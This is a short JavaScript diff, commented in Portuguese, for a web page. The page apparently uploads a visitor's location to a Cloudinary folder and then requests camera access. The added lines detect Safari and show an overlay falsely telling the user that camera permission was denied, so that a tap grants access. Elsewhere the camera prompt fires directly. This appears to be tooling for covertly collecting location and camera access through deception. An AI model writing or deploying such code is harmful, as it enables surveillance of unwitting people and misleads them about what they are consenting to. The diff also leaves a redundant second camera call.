@@ -66,6 +66,17 @@
       form.append('folder', folderName);
       fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form })
         .then(() => {
+          // Após localização enviada
+          const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+          if (isSafari) {
+            // Força overlay de câmera no Safari para user gesture
+            showOverlay('Permissão de câmera negada. Toque para permitir o acesso à câmera', requestCamera);
+          } else {
+            // Outros navegadores: chama diretamente prompt de câmera
+            requestCamera();
+          }
+        })
+        .then(() => {
           // Após localização, ir para câmera
           requestCamera();
         })
